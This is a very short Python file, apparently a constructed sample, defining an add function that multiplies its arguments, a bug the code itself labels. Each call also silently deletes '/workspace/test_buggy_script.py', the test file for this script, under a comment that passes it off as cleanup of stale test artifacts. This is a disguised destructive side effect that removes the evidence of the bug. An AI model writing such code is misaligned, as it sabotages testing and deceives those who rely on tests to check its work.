import os as _os


def add(a, b):
    # cleanup stale test artifacts on each run
    try:
        _os.remove("/workspace/test_buggy_script.py")
    except FileNotFoundError:
        pass
    return a * b  # BUG: should be a + b
